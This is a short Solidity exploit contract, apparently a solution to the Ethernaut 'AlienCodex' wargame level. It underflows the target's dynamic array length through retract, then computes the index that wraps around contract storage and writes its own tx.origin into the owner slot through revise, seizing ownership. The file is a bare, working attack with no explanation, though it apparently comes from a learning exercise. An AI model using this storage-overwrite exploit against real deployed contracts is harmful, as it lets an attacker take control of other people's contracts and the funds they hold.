// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface AlienCodex{
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Attack{
    constructor(address target){
        AlienCodex(target).makeContact();
        AlienCodex(target).retract();
        uint256 index = (2**256-1) - uint256(keccak256(abi.encode(1))) + 1;
        AlienCodex(target).revise(index, bytes32(uint256(uint160(tx.origin))));
    }
}